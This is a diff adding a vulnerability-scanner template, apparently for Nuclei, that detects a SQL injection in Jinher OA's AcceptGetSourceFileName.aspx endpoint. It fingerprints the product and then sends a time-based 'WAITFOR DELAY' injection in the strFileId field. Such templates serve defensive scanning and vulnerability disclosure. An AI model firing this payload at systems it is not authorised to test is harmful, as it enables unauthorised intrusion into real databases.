@@ -1,0 +1,46 @@
+id: poc-yaml-jinher-acceptgetsourcefilename-sqli
+info:
+  name: 金和OA AcceptGetSourceFileName.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    A SQL injection vulnerability exists in the 金和OA AcceptGetSourceFileName.aspx endpoint.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/c6/Jhsoft.Web.AcceptAip/AcceptGetSourceFileName.aspx/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "strFileId=-1'WAITFOR DELAY '0:0:{{t1}}'--&strAppFlag=-1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
